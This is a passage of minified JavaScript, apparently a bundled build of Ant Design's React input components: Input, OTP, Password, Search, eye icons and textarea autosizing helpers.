          (Cr = Mt.current) === null ||
            Cr === void 0 ||
            Cr.setSelectionRange(ar, gr, br);
        },
        select: function () {
          var ar;
          (ar = Mt.current) === null || ar === void 0 || ar.select();
        },
        input: Mt.current,
        nativeElement:
          ((Yt = Ft.current) === null || Yt === void 0
            ? void 0
            : Yt.nativeElement) || Mt.current,
      };
    }),
      reactExports.useEffect(
        function () {
          Vt.current && (Vt.current = !1),
            Wt(function (Yt) {
              return Yt && St ? !1 : Yt;
            });
        },
        [St]
      );
    var nr = function (rr, ar, gr) {
      var br = ar;
      if (
        !Gt.current &&
        Zt.exceedFormatter &&
        Zt.max &&
        Zt.strategy(ar) > Zt.max
      ) {
        if (((br = Zt.exceedFormatter(ar, { max: Zt.max })), ar !== br)) {
          var Cr, Rr;
          Qt([
            ((Cr = Mt.current) === null || Cr === void 0
              ? void 0
              : Cr.selectionStart) || 0,
            ((Rr = Mt.current) === null || Rr === void 0
              ? void 0
              : Rr.selectionEnd) || 0,
          ]);
        }
      } else if (gr.source === "compositionEnd") return;
      Dt(br), Mt.current && resolveOnChange(Mt.current, rr, s, br);
    };
    reactExports.useEffect(
      function () {
        if (qt) {
          var Yt;
          (Yt = Mt.current) === null ||
            Yt === void 0 ||
            Yt.setSelectionRange.apply(Yt, _toConsumableArray(qt));
        }
      },
      [qt]
    );
    var tr = function (rr) {
        nr(rr, rr.target.value, { source: "change" });
      },
      Xt = function (rr) {
        (Gt.current = !1),
          nr(rr, rr.currentTarget.value, { source: "compositionEnd" }),
          It == null || It(rr);
      },
      hr = function (rr) {
        ot && rr.key === "Enter" && !Vt.current && ((Vt.current = !0), ot(rr)),
          st == null || st(rr);
      },
      cr = function (rr) {
        rr.key === "Enter" && (Vt.current = !1), ft == null || ft(rr);
      },
      yr = function (rr) {
        Wt(!0), tt == null || tt(rr);
      },
      vr = function (rr) {
        Vt.current && (Vt.current = !1), Wt(!1), nt == null || nt(rr);
      },
      xr = function (rr) {
        Dt(""), Tt(), Mt.current && resolveOnChange(Mt.current, rr, s);
      },
      Sr = sr && "".concat(gt, "-out-of-range"),
      or = function () {
        var rr = omit(i, [
          "prefixCls",
          "onPressEnter",
          "addonBefore",
          "addonAfter",
          "prefix",
          "suffix",
          "allowClear",
          "defaultValue",
          "showCount",
          "count",
          "classes",
          "htmlSize",
          "styles",
          "classNames",
          "onClear",
        ]);
        return React$1.createElement(
          "input",
          _extends({ autoComplete: o }, rr, {
            onChange: tr,
            onFocus: yr,
            onBlur: vr,
            onKeyDown: hr,
            onKeyUp: cr,
            className: classNames(
              gt,
              _defineProperty$1({}, "".concat(gt, "-disabled"), St),
              $t == null ? void 0 : $t.input
            ),
            style: kt == null ? void 0 : kt.input,
            ref: Mt,
            size: vt,
            type: yt,
            onCompositionStart: function (gr) {
              (Gt.current = !0), Rt == null || Rt(gr);
            },
            onCompositionEnd: Xt,
          })
        );
      },
      mr = function () {
        var rr = Number(Jt) > 0;
        if (Ct || Zt.show) {
          var ar = Zt.showFormatter
            ? Zt.showFormatter({ value: Ut, count: er, maxLength: Jt })
            : "".concat(er).concat(rr ? " / ".concat(Jt) : "");
          return React$1.createElement(
            React$1.Fragment,
            null,
            Zt.show &&
              React$1.createElement(
                "span",
                {
                  className: classNames(
                    "".concat(gt, "-show-count-suffix"),
                    _defineProperty$1(
                      {},
                      "".concat(gt, "-show-count-has-suffix"),
                      !!Ct
                    ),
                    $t == null ? void 0 : $t.count
                  ),
                  style: _objectSpread2$1({}, kt == null ? void 0 : kt.count),
                },
                ar
              ),
            Ct
          );
        }
        return null;
      };
    return React$1.createElement(
      BaseInput,
      _extends({}, Ot, {
        prefixCls: gt,
        className: classNames(_t, Sr),
        handleReset: xr,
        value: Ut,
        focused: Bt,
        triggerFocus: Tt,
        suffix: mr(),
        disabled: St,
        classes: wt,
        classNames: $t,
        styles: kt,
      }),
      or()
    );
  });
const Group = (i) => {
    const { getPrefixCls: a, direction: o } =
        reactExports.useContext(ConfigContext),
      { prefixCls: s, className: tt } = i,
      nt = a("input-group", s),
      ot = a("input"),
      [st, ft] = useStyle$2(ot),
      ht = classNames(
        nt,
        {
          [`${nt}-lg`]: i.size === "large",
          [`${nt}-sm`]: i.size === "small",
          [`${nt}-compact`]: i.compact,
          [`${nt}-rtl`]: o === "rtl",
        },
        ft,
        tt
      ),
      gt = reactExports.useContext(FormItemInputContext),
      St = reactExports.useMemo(
        () => Object.assign(Object.assign({}, gt), { isFormItemInput: !1 }),
        [gt]
      );
    return st(
      reactExports.createElement(
        "span",
        {
          className: ht,
          style: i.style,
          onMouseEnter: i.onMouseEnter,
          onMouseLeave: i.onMouseLeave,
          onFocus: i.onFocus,
          onBlur: i.onBlur,
        },
        reactExports.createElement(
          FormItemInputContext.Provider,
          { value: St },
          i.children
        )
      )
    );
  },
  getAllowClear = (i) => {
    let a;
    return (
      typeof i == "object" && i != null && i.clearIcon
        ? (a = i)
        : i && (a = { clearIcon: React$1.createElement(RefIcon$b, null) }),
      a
    );
  };
function useRemovePasswordTimeout(i, a) {
  const o = reactExports.useRef([]),
    s = () => {
      o.current.push(
        setTimeout(() => {
          var tt, nt, ot, st;
          !((tt = i.current) === null || tt === void 0) &&
            tt.input &&
            ((nt = i.current) === null || nt === void 0
              ? void 0
              : nt.input.getAttribute("type")) === "password" &&
            !((ot = i.current) === null || ot === void 0) &&
            ot.input.hasAttribute("value") &&
            ((st = i.current) === null ||
              st === void 0 ||
              st.input.removeAttribute("value"));
        })
      );
    };
  return (
    reactExports.useEffect(
      () => (
        a && s(),
        () =>
          o.current.forEach((tt) => {
            tt && clearTimeout(tt);
          })
      ),
      []
    ),
    s
  );
}
function hasPrefixSuffix(i) {
  return !!(i.prefix || i.suffix || i.allowClear || i.showCount);
}
var __rest$5 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const Input$1 = reactExports.forwardRef((i, a) => {
    var o;
    const {
        prefixCls: s,
        bordered: tt = !0,
        status: nt,
        size: ot,
        disabled: st,
        onBlur: ft,
        onFocus: ht,
        suffix: gt,
        allowClear: St,
        addonAfter: vt,
        addonBefore: _t,
        className: Et,
        style: Ct,
        styles: Pt,
        rootClassName: bt,
        onChange: xt,
        classNames: yt,
        variant: wt,
      } = i,
      $t = __rest$5(i, [
        "prefixCls",
        "bordered",
        "status",
        "size",
        "disabled",
        "onBlur",
        "onFocus",
        "suffix",
        "allowClear",
        "addonAfter",
        "addonBefore",
        "className",
        "style",
        "styles",
        "rootClassName",
        "onChange",
        "classNames",
        "variant",
      ]),
      {
        getPrefixCls: kt,
        direction: Rt,
        input: It,
      } = React$1.useContext(ConfigContext),
      Ot = kt("input", s),
      Nt = reactExports.useRef(null),
      zt = useCSSVarCls(Ot),
      [Bt, Wt, Gt] = useStyle$2(Ot, zt),
      { compactSize: Vt, compactItemClassnames: Mt } = useCompactItemContext(
        Ot,
        Rt
      ),
      Ft = useSize((tr) => {
        var Xt;
        return (Xt = ot ?? Vt) !== null && Xt !== void 0 ? Xt : tr;
      }),
      Tt = React$1.useContext(DisabledContext),
      At = st ?? Tt,
      {
        status: Lt,
        hasFeedback: jt,
        feedbackIcon: Dt,
      } = reactExports.useContext(FormItemInputContext),
      Ut = getMergedStatus(Lt, nt),
      Ht = hasPrefixSuffix(i) || !!jt;
    reactExports.useRef(Ht);
    const Kt = useRemovePasswordTimeout(Nt, !0),
      qt = (tr) => {
        Kt(), ft == null || ft(tr);
      },
      Qt = (tr) => {
        Kt(), ht == null || ht(tr);
      },
      Zt = (tr) => {
        Kt(), xt == null || xt(tr);
      },
      Jt =
        (jt || gt) &&
        React$1.createElement(React$1.Fragment, null, gt, jt && Dt),
      er = getAllowClear(St ?? (It == null ? void 0 : It.allowClear)),
      [sr, nr] = useVariant("input", wt, tt);
    return Bt(
      React$1.createElement(
        Input$2,
        Object.assign(
          {
            ref: composeRef(a, Nt),
            prefixCls: Ot,
            autoComplete: It == null ? void 0 : It.autoComplete,
          },
          $t,
          {
            disabled: At,
            onBlur: qt,
            onFocus: Qt,
            style: Object.assign(
              Object.assign({}, It == null ? void 0 : It.style),
              Ct
            ),
            styles: Object.assign(
              Object.assign({}, It == null ? void 0 : It.styles),
              Pt
            ),
            suffix: Jt,
            allowClear: er,
            className: classNames(
              Et,
              bt,
              Gt,
              zt,
              Mt,
              It == null ? void 0 : It.className
            ),
            onChange: Zt,
            addonBefore:
              _t &&
              React$1.createElement(
                ContextIsolator,
                { form: !0, space: !0 },
                _t
              ),
            addonAfter:
              vt &&
              React$1.createElement(
                ContextIsolator,
                { form: !0, space: !0 },
                vt
              ),
            classNames: Object.assign(
              Object.assign(
                Object.assign({}, yt),
                It == null ? void 0 : It.classNames
              ),
              {
                input: classNames(
                  {
                    [`${Ot}-sm`]: Ft === "small",
                    [`${Ot}-lg`]: Ft === "large",
                    [`${Ot}-rtl`]: Rt === "rtl",
                  },
                  yt == null ? void 0 : yt.input,
                  (o = It == null ? void 0 : It.classNames) === null ||
                    o === void 0
                    ? void 0
                    : o.input,
                  Wt
                ),
                variant: classNames(
                  { [`${Ot}-${sr}`]: nr },
                  getStatusClassNames(Ot, Ut)
                ),
                affixWrapper: classNames(
                  {
                    [`${Ot}-affix-wrapper-sm`]: Ft === "small",
                    [`${Ot}-affix-wrapper-lg`]: Ft === "large",
                    [`${Ot}-affix-wrapper-rtl`]: Rt === "rtl",
                  },
                  Wt
                ),
                wrapper: classNames({ [`${Ot}-group-rtl`]: Rt === "rtl" }, Wt),
                groupWrapper: classNames(
                  {
                    [`${Ot}-group-wrapper-sm`]: Ft === "small",
                    [`${Ot}-group-wrapper-lg`]: Ft === "large",
                    [`${Ot}-group-wrapper-rtl`]: Rt === "rtl",
                    [`${Ot}-group-wrapper-${sr}`]: nr,
                  },
                  getStatusClassNames(`${Ot}-group-wrapper`, Ut, jt),
                  Wt
                ),
              }
            ),
          }
        )
      )
    );
  }),
  genOTPStyle = (i) => {
    const { componentCls: a, paddingXS: o } = i;
    return {
      [a]: {
        display: "inline-flex",
        alignItems: "center",
        flexWrap: "nowrap",
        columnGap: o,
        "&-rtl": { direction: "rtl" },
        [`${a}-input`]: { textAlign: "center", paddingInline: i.paddingXXS },
        [`&${a}-sm ${a}-input`]: {
          paddingInline: i.calc(i.paddingXXS).div(2).equal(),
        },
        [`&${a}-lg ${a}-input`]: { paddingInline: i.paddingXS },
      },
    };
  },
  useStyle = genStyleHooks(
    ["Input", "OTP"],
    (i) => {
      const a = merge(i, initInputToken(i));
      return [genOTPStyle(a)];
    },
    initComponentToken
  );
var __rest$4 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const OTPInput = reactExports.forwardRef((i, a) => {
  const { value: o, onChange: s, onActiveChange: tt, index: nt, mask: ot } = i,
    st = __rest$4(i, ["value", "onChange", "onActiveChange", "index", "mask"]),
    ft = o && typeof ot == "string" ? ot : o,
    ht = (Et) => {
      s(nt, Et.target.value);
    },
    gt = reactExports.useRef(null);
  reactExports.useImperativeHandle(a, () => gt.current);
  const St = () => {
      wrapperRaf(() => {
        var Et;
        const Ct =
          (Et = gt.current) === null || Et === void 0 ? void 0 : Et.input;
        document.activeElement === Ct && Ct && Ct.select();
      });
    },
    vt = (Et) => {
      const { key: Ct, ctrlKey: Pt, metaKey: bt } = Et;
      Ct === "ArrowLeft"
        ? tt(nt - 1)
        : Ct === "ArrowRight"
        ? tt(nt + 1)
        : Ct === "z" && (Pt || bt) && Et.preventDefault(),
        St();
    },
    _t = (Et) => {
      Et.key === "Backspace" && !o && tt(nt - 1), St();
    };
  return reactExports.createElement(
    Input$1,
    Object.assign({ type: ot === !0 ? "password" : "text" }, st, {
      ref: gt,
      value: ft,
      onInput: ht,
      onFocus: St,
      onKeyDown: vt,
      onKeyUp: _t,
      onMouseDown: St,
      onMouseUp: St,
    })
  );
});
var __rest$3 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
function strToArr(i) {
  return (i || "").split("");
}
const OTP = reactExports.forwardRef((i, a) => {
  const {
      prefixCls: o,
      length: s = 6,
      size: tt,
      defaultValue: nt,
      value: ot,
      onChange: st,
      formatter: ft,
      variant: ht,
      disabled: gt,
      status: St,
      autoFocus: vt,
      mask: _t,
      type: Et,
      onInput: Ct,
      inputMode: Pt,
    } = i,
    bt = __rest$3(i, [
      "prefixCls",
      "length",
      "size",
      "defaultValue",
      "value",
      "onChange",
      "formatter",
      "variant",
      "disabled",
      "status",
      "autoFocus",
      "mask",
      "type",
      "onInput",
      "inputMode",
    ]),
    { getPrefixCls: xt, direction: yt } =
      reactExports.useContext(ConfigContext),
    wt = xt("otp", o),
    $t = pickAttrs(bt, { aria: !0, data: !0, attr: !0 }),
    kt = useCSSVarCls(wt),
    [Rt, It, Ot] = useStyle(wt, kt),
    Nt = useSize((Ht) => tt ?? Ht),
    zt = reactExports.useContext(FormItemInputContext),
    Bt = getMergedStatus(zt.status, St),
    Wt = reactExports.useMemo(
      () =>
        Object.assign(Object.assign({}, zt), {
          status: Bt,
          hasFeedback: !1,
          feedbackIcon: null,
        }),
      [zt, Bt]
    ),
    Gt = reactExports.useRef(null),
    Vt = reactExports.useRef({});
  reactExports.useImperativeHandle(a, () => ({
    focus: () => {
      var Ht;
      (Ht = Vt.current[0]) === null || Ht === void 0 || Ht.focus();
    },
    blur: () => {
      var Ht;
      for (let Kt = 0; Kt < s; Kt += 1)
        (Ht = Vt.current[Kt]) === null || Ht === void 0 || Ht.blur();
    },
    nativeElement: Gt.current,
  }));
  const Mt = (Ht) => (ft ? ft(Ht) : Ht),
    [Ft, Tt] = reactExports.useState(strToArr(Mt(nt || "")));
  reactExports.useEffect(() => {
    ot !== void 0 && Tt(strToArr(ot));
  }, [ot]);
  const At = useEvent((Ht) => {
      Tt(Ht),
        Ct && Ct(Ht),
        st &&
          Ht.length === s &&
          Ht.every((Kt) => Kt) &&
          Ht.some((Kt, qt) => Ft[qt] !== Kt) &&
          st(Ht.join(""));
    }),
    Lt = useEvent((Ht, Kt) => {
      let qt = _toConsumableArray(Ft);
      for (let Zt = 0; Zt < Ht; Zt += 1) qt[Zt] || (qt[Zt] = "");
      Kt.length <= 1
        ? (qt[Ht] = Kt)
        : (qt = qt.slice(0, Ht).concat(strToArr(Kt))),
        (qt = qt.slice(0, s));
      for (let Zt = qt.length - 1; Zt >= 0 && !qt[Zt]; Zt -= 1) qt.pop();
      const Qt = Mt(qt.map((Zt) => Zt || " ").join(""));
      return (
        (qt = strToArr(Qt).map((Zt, Jt) =>
          Zt === " " && !qt[Jt] ? qt[Jt] : Zt
        )),
        qt
      );
    }),
    jt = (Ht, Kt) => {
      var qt;
      const Qt = Lt(Ht, Kt),
        Zt = Math.min(Ht + Kt.length, s - 1);
      Zt !== Ht &&
        Qt[Ht] !== void 0 &&
        ((qt = Vt.current[Zt]) === null || qt === void 0 || qt.focus()),
        At(Qt);
    },
    Dt = (Ht) => {
      var Kt;
      (Kt = Vt.current[Ht]) === null || Kt === void 0 || Kt.focus();
    },
    Ut = {
      variant: ht,
      disabled: gt,
      status: Bt,
      mask: _t,
      type: Et,
      inputMode: Pt,
    };
  return Rt(
    reactExports.createElement(
      "div",
      Object.assign({}, $t, {
        ref: Gt,
        className: classNames(
          wt,
          {
            [`${wt}-sm`]: Nt === "small",
            [`${wt}-lg`]: Nt === "large",
            [`${wt}-rtl`]: yt === "rtl",
          },
          Ot,
          It
        ),
      }),
      reactExports.createElement(
        FormItemInputContext.Provider,
        { value: Wt },
        Array.from({ length: s }).map((Ht, Kt) => {
          const qt = `otp-${Kt}`,
            Qt = Ft[Kt] || "";
          return reactExports.createElement(
            OTPInput,
            Object.assign(
              {
                ref: (Zt) => {
                  Vt.current[Kt] = Zt;
                },
                key: qt,
                index: Kt,
                size: Nt,
                htmlSize: 1,
                className: `${wt}-input`,
                onChange: jt,
                value: Qt,
                onActiveChange: Dt,
                autoFocus: Kt === 0 && vt,
              },
              Ut
            )
          );
        })
      )
    )
  );
});
var EyeInvisibleOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M942.2 486.2Q889.47 375.11 816.7 305l-50.88 50.88C807.31 395.53 843.45 447.4 874.7 512 791.5 684.2 673.4 766 512 766q-72.67 0-133.87-22.38L323 798.75Q408 838 512 838q288.3 0 430.2-300.3a60.29 60.29 0 000-51.5zm-63.57-320.64L836 122.88a8 8 0 00-11.32 0L715.31 232.2Q624.86 186 512 186q-288.3 0-430.2 300.3a60.3 60.3 0 000 51.5q56.69 119.4 136.5 191.41L112.48 835a8 8 0 000 11.31L155.17 889a8 8 0 0011.31 0l712.15-712.12a8 8 0 000-11.32zM149.3 512C232.6 339.8 350.7 258 512 258c54.54 0 104.13 9.36 149.12 28.39l-70.3 70.3a176 176 0 00-238.13 238.13l-83.42 83.42C223.1 637.49 183.3 582.28 149.3 512zm246.7 0a112.11 112.11 0 01146.2-106.69L401.31 546.2A112 112 0 01396 512z",
          },
        },
        {
          tag: "path",
          attrs: {
            d: "M508 624c-3.46 0-6.87-.16-10.25-.47l-52.82 52.82a176.09 176.09 0 00227.42-227.42l-52.82 52.82c.31 3.38.47 6.79.47 10.25a111.94 111.94 0 01-112 112z",
          },
        },
      ],
    },
    name: "eye-invisible",
    theme: "outlined",
  },
  EyeInvisibleOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: EyeInvisibleOutlined$1 })
    );
  },
  RefIcon$5 = reactExports.forwardRef(EyeInvisibleOutlined),
  EyeOutlined$1 = {
    icon: {
      tag: "svg",
      attrs: { viewBox: "64 64 896 896", focusable: "false" },
      children: [
        {
          tag: "path",
          attrs: {
            d: "M942.2 486.2C847.4 286.5 704.1 186 512 186c-192.2 0-335.4 100.5-430.2 300.3a60.3 60.3 0 000 51.5C176.6 737.5 319.9 838 512 838c192.2 0 335.4-100.5 430.2-300.3 7.7-16.2 7.7-35 0-51.5zM512 766c-161.3 0-279.4-81.8-362.7-254C232.6 339.8 350.7 258 512 258c161.3 0 279.4 81.8 362.7 254C791.5 684.2 673.4 766 512 766zm-4-430c-97.2 0-176 78.8-176 176s78.8 176 176 176 176-78.8 176-176-78.8-176-176-176zm0 288c-61.9 0-112-50.1-112-112s50.1-112 112-112 112 50.1 112 112-50.1 112-112 112z",
          },
        },
      ],
    },
    name: "eye",
    theme: "outlined",
  },
  EyeOutlined = function (a, o) {
    return reactExports.createElement(
      Icon,
      _extends({}, a, { ref: o, icon: EyeOutlined$1 })
    );
  },
  RefIcon$4 = reactExports.forwardRef(EyeOutlined),
  __rest$2 = function (i, a) {
    var o = {};
    for (var s in i)
      Object.prototype.hasOwnProperty.call(i, s) &&
        a.indexOf(s) < 0 &&
        (o[s] = i[s]);
    if (i != null && typeof Object.getOwnPropertySymbols == "function")
      for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
        a.indexOf(s[tt]) < 0 &&
          Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
          (o[s[tt]] = i[s[tt]]);
    return o;
  };
const defaultIconRender = (i) =>
    i
      ? reactExports.createElement(RefIcon$4, null)
      : reactExports.createElement(RefIcon$5, null),
  actionMap = { click: "onClick", hover: "onMouseOver" },
  Password = reactExports.forwardRef((i, a) => {
    const {
        disabled: o,
        action: s = "click",
        visibilityToggle: tt = !0,
        iconRender: nt = defaultIconRender,
      } = i,
      ot = reactExports.useContext(DisabledContext),
      st = o ?? ot,
      ft = typeof tt == "object" && tt.visible !== void 0,
      [ht, gt] = reactExports.useState(() => (ft ? tt.visible : !1)),
      St = reactExports.useRef(null);
    reactExports.useEffect(() => {
      ft && gt(tt.visible);
    }, [ft, tt]);
    const vt = useRemovePasswordTimeout(St),
      _t = () => {
        var Nt;
        if (st) return;
        ht && vt();
        const zt = !ht;
        gt(zt),
          typeof tt == "object" &&
            ((Nt = tt.onVisibleChange) === null ||
              Nt === void 0 ||
              Nt.call(tt, zt));
      },
      Et = (Nt) => {
        const zt = actionMap[s] || "",
          Bt = nt(ht),
          Wt = {
            [zt]: _t,
            className: `${Nt}-icon`,
            key: "passwordIcon",
            onMouseDown: (Gt) => {
              Gt.preventDefault();
            },
            onMouseUp: (Gt) => {
              Gt.preventDefault();
            },
          };
        return reactExports.cloneElement(
          reactExports.isValidElement(Bt)
            ? Bt
            : reactExports.createElement("span", null, Bt),
          Wt
        );
      },
      { className: Ct, prefixCls: Pt, inputPrefixCls: bt, size: xt } = i,
      yt = __rest$2(i, ["className", "prefixCls", "inputPrefixCls", "size"]),
      { getPrefixCls: wt } = reactExports.useContext(ConfigContext),
      $t = wt("input", bt),
      kt = wt("input-password", Pt),
      Rt = tt && Et(kt),
      It = classNames(kt, Ct, { [`${kt}-${xt}`]: !!xt }),
      Ot = Object.assign(
        Object.assign(
          {},
          omit(yt, ["suffix", "iconRender", "visibilityToggle"])
        ),
        {
          type: ht ? "text" : "password",
          className: It,
          prefixCls: $t,
          suffix: Rt,
        }
      );
    return (
      xt && (Ot.size = xt),
      reactExports.createElement(
        Input$1,
        Object.assign({ ref: composeRef(a, St) }, Ot)
      )
    );
  });
var __rest$1 = function (i, a) {
  var o = {};
  for (var s in i)
    Object.prototype.hasOwnProperty.call(i, s) &&
      a.indexOf(s) < 0 &&
      (o[s] = i[s]);
  if (i != null && typeof Object.getOwnPropertySymbols == "function")
    for (var tt = 0, s = Object.getOwnPropertySymbols(i); tt < s.length; tt++)
      a.indexOf(s[tt]) < 0 &&
        Object.prototype.propertyIsEnumerable.call(i, s[tt]) &&
        (o[s[tt]] = i[s[tt]]);
  return o;
};
const Search = reactExports.forwardRef((i, a) => {
  const {
      prefixCls: o,
      inputPrefixCls: s,
      className: tt,
      size: nt,
      suffix: ot,
      enterButton: st = !1,
      addonAfter: ft,
      loading: ht,
      disabled: gt,
      onSearch: St,
      onChange: vt,
      onCompositionStart: _t,
      onCompositionEnd: Et,
    } = i,
    Ct = __rest$1(i, [
      "prefixCls",
      "inputPrefixCls",
      "className",
      "size",
      "suffix",
      "enterButton",
      "addonAfter",
      "loading",
      "disabled",
      "onSearch",
      "onChange",
      "onCompositionStart",
      "onCompositionEnd",
    ]),
    { getPrefixCls: Pt, direction: bt } =
      reactExports.useContext(ConfigContext),
    xt = reactExports.useRef(!1),
    yt = Pt("input-search", o),
    wt = Pt("input", s),
    { compactSize: $t } = useCompactItemContext(yt, bt),
    kt = useSize((Lt) => {
      var jt;
      return (jt = nt ?? $t) !== null && jt !== void 0 ? jt : Lt;
    }),
    Rt = reactExports.useRef(null),
    It = (Lt) => {
      Lt != null &&
        Lt.target &&
        Lt.type === "click" &&
        St &&
        St(Lt.target.value, Lt, { source: "clear" }),
        vt == null || vt(Lt);
    },
    Ot = (Lt) => {
      var jt;
      document.activeElement ===
        ((jt = Rt.current) === null || jt === void 0 ? void 0 : jt.input) &&
        Lt.preventDefault();
    },
    Nt = (Lt) => {
      var jt, Dt;
      St &&
        St(
          (Dt =
            (jt = Rt.current) === null || jt === void 0 ? void 0 : jt.input) ===
            null || Dt === void 0
            ? void 0
            : Dt.value,
          Lt,
          { source: "input" }
        );
    },
    zt = (Lt) => {
      xt.current || ht || Nt(Lt);
    },
    Bt =
      typeof st == "boolean"
        ? reactExports.createElement(RefIcon$6, null)
        : null,
    Wt = `${yt}-button`;
  let Gt;
  const Vt = st || {},
    Mt = Vt.type && Vt.type.__ANT_BUTTON === !0;
  Mt || Vt.type === "button"
    ? (Gt = cloneElement(
        Vt,
        Object.assign(
          {
            onMouseDown: Ot,
            onClick: (Lt) => {
              var jt, Dt;
              (Dt =
                (jt = Vt == null ? void 0 : Vt.props) === null || jt === void 0
                  ? void 0
                  : jt.onClick) === null ||
                Dt === void 0 ||
                Dt.call(jt, Lt),
                Nt(Lt);
            },
            key: "enterButton",
          },
          Mt ? { className: Wt, size: kt } : {}
        )
      ))
    : (Gt = reactExports.createElement(
        Button,
        {
          className: Wt,
          type: st ? "primary" : void 0,
          size: kt,
          disabled: gt,
          key: "enterButton",
          onMouseDown: Ot,
          onClick: Nt,
          loading: ht,
          icon: Bt,
        },
        st
      )),
    ft && (Gt = [Gt, cloneElement(ft, { key: "addonAfter" })]);
  const Ft = classNames(
      yt,
      {
        [`${yt}-rtl`]: bt === "rtl",
        [`${yt}-${kt}`]: !!kt,
        [`${yt}-with-button`]: !!st,
      },
      tt
    ),
    Tt = (Lt) => {
      (xt.current = !0), _t == null || _t(Lt);
    },
    At = (Lt) => {
      (xt.current = !1), Et == null || Et(Lt);
    };
  return reactExports.createElement(
    Input$1,
    Object.assign({ ref: composeRef(Rt, a), onPressEnter: zt }, Ct, {
      size: kt,
      onCompositionStart: Tt,
      onCompositionEnd: At,
      prefixCls: wt,
      addonAfter: Gt,
      suffix: ot,
      onChange: It,
      className: Ft,
      disabled: gt,
    })
  );
});
var HIDDEN_TEXTAREA_STYLE = `
  min-height:0 !important;
  max-height:none !important;
  height:0 !important;
  visibility:hidden !important;
  overflow:hidden !important;
  position:absolute !important;
  z-index:-1000 !important;
  top:0 !important;
  right:0 !important;
  pointer-events: none !important;
`,
  SIZING_STYLE = [
    "letter-spacing",
    "line-height",
    "padding-top",
    "padding-bottom",
    "font-family",
    "font-weight",
    "font-size",
    "font-variant",
    "text-rendering",
    "text-transform",
    "width",
    "text-indent",
    "padding-left",
    "padding-right",
    "border-width",
    "box-sizing",
    "word-break",
    "white-space",
  ],
  computedStyleCache = {},
  hiddenTextarea;
function calculateNodeStyling(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1,
    o =
      i.getAttribute("id") ||
      i.getAttribute("data-reactid") ||
      i.getAttribute("name");
  if (a && computedStyleCache[o]) return computedStyleCache[o];
  var s = window.getComputedStyle(i),
    tt =
      s.getPropertyValue("box-sizing") ||
      s.getPropertyValue("-moz-box-sizing") ||
      s.getPropertyValue("-webkit-box-sizing"),
    nt =
      parseFloat(s.getPropertyValue("padding-bottom")) +
      parseFloat(s.getPropertyValue("padding-top")),
    ot =
      parseFloat(s.getPropertyValue("border-bottom-width")) +
      parseFloat(s.getPropertyValue("border-top-width")),
    st = SIZING_STYLE.map(function (ht) {
      return "".concat(ht, ":").concat(s.getPropertyValue(ht));
    }).join(";"),
    ft = { sizingStyle: st, paddingSize: nt, borderSize: ot, boxSizing: tt };
  return a && o && (computedStyleCache[o] = ft), ft;
}
function calculateAutoSizeStyle(i) {
  var a = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : !1,
    o = arguments.length > 2 && arguments[2] !== void 0 ? arguments[2] : null,
    s = arguments.length > 3 && arguments[3] !== void 0 ? arguments[3] : null;
  hiddenTextarea ||
    ((hiddenTextarea = document.createElement("textarea")),
    hiddenTextarea.setAttribute("tab-index", "-1"),
    hiddenTextarea.setAttribute("aria-hidden", "true"),
    hiddenTextarea.setAttribute("name", "hiddenTextarea"),
    document.body.appendChild(hiddenTextarea)),
    i.getAttribute("wrap")
      ? hiddenTextarea.setAttribute("wrap", i.getAttribute("wrap"))
      : hiddenTextarea.removeAttribute("wrap");
  var tt = calculateNodeStyling(i, a),
    nt = tt.paddingSize,
    ot = tt.borderSize,
    st = tt.boxSizing,
    ft = tt.sizingStyle;
  hiddenTextarea.setAttribute(
    "style",
    "".concat(ft, ";").concat(HIDDEN_TEXTAREA_STYLE)
  ),
    (hiddenTextarea.value = i.value || i.placeholder || "");
  var ht = void 0,
    gt = void 0,
    St,
    vt = hiddenTextarea.scrollHeight;
  if (
    (st === "border-box" ? (vt += ot) : st === "content-box" && (vt -= nt),
    o !== null || s !== null)
  ) {
    hiddenTextarea.value = " ";
    var _t = hiddenTextarea.scrollHeight - nt;
    o !== null &&
      ((ht = _t * o),
      st === "border-box" && (ht = ht + nt + ot),
      (vt = Math.max(ht, vt))),
      s !== null &&
        ((gt = _t * s),
        st === "border-box" && (gt = gt + nt + ot),
        (St = vt > gt ? "" : "hidden"),
        (vt = Math.min(gt, vt)));
  }
  var Et = { height: vt, overflowY: St, resize: "none" };
  return ht && (Et.minHeight = ht), gt && (Et.maxHeight = gt), Et;
}
var _excluded$3 = [
    "prefixCls",
    "defaultValue",
    "value",
    "autoSize",
    "onResize",
    "className",
    "style",
    "disabled",
    "onChange",
    "onInternalAutoSize",
  ],
  RESIZE_START = 0,
  RESIZE_MEASURING = 1,
  RESIZE_STABLE = 2,
  ResizableTextArea = reactExports.forwardRef(function (i, a) {
    var o = i,
      s = o.prefixCls,
      tt = o.defaultValue,
      nt = o.value,
